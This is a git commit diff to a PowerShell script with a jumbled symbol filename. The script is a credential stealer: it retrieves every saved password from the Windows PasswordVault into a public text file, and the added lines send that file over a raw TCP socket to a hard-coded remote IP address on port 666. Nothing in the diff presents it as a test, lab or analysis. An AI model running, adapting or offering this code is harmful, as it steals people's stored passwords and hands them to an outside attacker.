4ac7d4f0d9d95e12f906d74e588ca4ce8d6c2b33
Savitar407 <42724977+Savitar407@users.noreply.github.com>
2021-02-21 19:10:48 -0500

    Update #$(#$^#)$^#$^)&#$^@^)$^&.ps1

--- #$(#$^#)$^#$^)&#$^@^)$^&.ps1
+++ #$(#$^#)$^#$^)&#$^@^)$^&.ps1
@@ -1,2 +1,10 @@
 [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 (new-object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword(); $_ } >> C:\Users\Public\passwords.txt
+cd C:\Users\Public
+$port=666
+$remoteHost = "209.151.149.234"
+$message = type passwords.txt
+$socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port)
+$data = [System.Text.Encoding]::ASCII.GetBytes($message)
+$stream = $socket.GetStream()
+$stream.Write($data, 0, $data.Length)
